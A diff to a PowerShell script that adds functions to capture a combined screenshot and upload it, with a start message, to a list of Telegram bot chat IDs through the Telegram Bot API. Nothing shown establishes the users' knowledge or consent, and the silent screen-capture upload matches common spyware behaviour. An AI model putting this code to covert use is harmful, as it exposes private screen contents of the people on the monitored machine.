@@ -12,4 +12,70 @@ function Log($message, $level="INFO") {
     Add-Content -Path $LOG_FILE -Value $entry
 }
 
-Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data" -InFile $global:tempJpg -Body @{ chat_id = $id }
+function Send-StartMessage {
+    foreach ($id in $CHAT_IDS) {
+        try {
+            $url = "https://api.telegram.org/bot$TOKEN/sendMessage"
+            $body = @{
+                chat_id = $id
+                text    = "Script Started ✅"
+            }
+            Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
+        } catch {
+            Log "Error sending start msg to $id: $_" "ERROR"
+        }
+    }
+    Send-CombinedScreenshot
+}
+
+function Send-CombinedScreenshot {
+    $bytes = Capture-CombinedImageBytes
+    if (-not $bytes) { Log "No image bytes to send" "WARN"; return }
+    try {
+        # save temporary JPG
+        [System.IO.File]::WriteAllBytes($global:tempJpg, $bytes)
+
+        foreach ($id in $CHAT_IDS) {
+            try {
+                $url = "https://api.telegram.org/bot$TOKEN/sendPhoto"
+
+                # build multipart content manually (PS 5.1 friendly)
+                $formFields = @{
+                    chat_id = $id
+                }
+                $fileBytes = Get-Content -Path $global:tempJpg -Encoding Byte
+
+                $boundary = [System.Guid]::NewGuid().ToString()
+                $LF = "`r`n"
+                $bodyStream = New-Object System.IO.MemoryStream
+                $writer = New-Object System.IO.StreamWriter($bodyStream)
+
+                foreach ($field in $formFields.GetEnumerator()) {
+                    $writer.Write("--$boundary$LF")
+                    $writer.Write("Content-Disposition: form-data; name=`"{0}`"$LF$LF{1}$LF" -f $field.Key, $field.Value)
+                }
+
+                # add file part
+                $writer.Write("--$boundary$LF")
+                $writer.Write("Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.jpg`"$LF")
+                $writer.Write("Content-Type: image/jpeg$LF$LF")
+                $writer.Flush()
+                $bodyStream.Write($fileBytes, 0, $fileBytes.Length)
+                $writer.Write("$LF--$boundary--$LF")
+                $writer.Flush()
+
+                $bodyStream.Position = 0
+                Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyStream.ToArray() -ErrorAction Stop
+
+                $writer.Dispose()
+                $bodyStream.Dispose()
+            } catch {
+                Log "Error sending screenshot to $id: $_" "ERROR"
+            }
+        }
+    } catch {
+        Log "Error saving/sending screenshot: $_" "ERROR"
+    } finally {
+        if (Test-Path $global:tempJpg) { Remove-Item $global:tempJpg -ErrorAction SilentlyContinue }
+    }
+}
